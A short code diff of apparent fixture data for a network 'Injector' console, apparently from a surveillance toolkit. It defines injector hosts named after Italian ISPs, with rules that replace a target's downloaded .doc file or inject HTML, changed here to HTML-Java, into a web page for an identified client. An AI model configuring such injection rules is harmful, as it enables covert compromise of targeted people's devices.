@@ -17,7 +17,7 @@ package it.ht.rcs.console.network.rest
                              new InjectorRule({ _id: '', action: 'REPLACE',     action_param_name: 'Document.doc',    disable_sync:  true, enabled: false, ident: 'STRING-CLIENT', ident_param: 'joey@gmail.com', probability: 100, resource: '*manual*.doc', target_id: ['t1'] })] }),
       
       new Injector({ _id: 'p2', address: '192.168.1.102', desc: 'Desc 192.168.1.102', name: 'Injector Fastweb',    poll: true, port: 4444, redirect: 'auto', redirection_tag: '', created_at: '2011-06-22T17:29:41+02:00', updated_at: '2011-06-22T17:29:41+02:00', version: 0,
-                     rules: [new InjectorRule({ _id: '', action: 'INJECT-HTML', action_param_name: 'f1', action_param: 'f1', disable_sync: false, enabled:  true, ident: 'STATIC-IP', ident_param: '1.2.3.4', probability:   0, resource: 'www.oracle.com/index.html', target_id: ['t1'] })] }),
+                     rules: [new InjectorRule({ _id: '', action: 'INJECT-HTML-JAVA', action_param_name: 'f1', action_param: 'f1', disable_sync: false, enabled:  true, ident: 'STATIC-IP', ident_param: '1.2.3.4', probability:   0, resource: 'www.oracle.com/index.html', target_id: ['t1'] })] }),
       
       new Injector({ _id: 'p3', address: '192.168.1.103', desc: 'Desc 192.168.1.103', name: 'Injector Infostrada', poll: false, port: 4444, redirect: 'auto', redirection_tag: '', created_at: '2011-06-22T17:29:41+02:00', updated_at: '2011-06-22T17:29:41+02:00', version: 0,
                      rules: [] }),
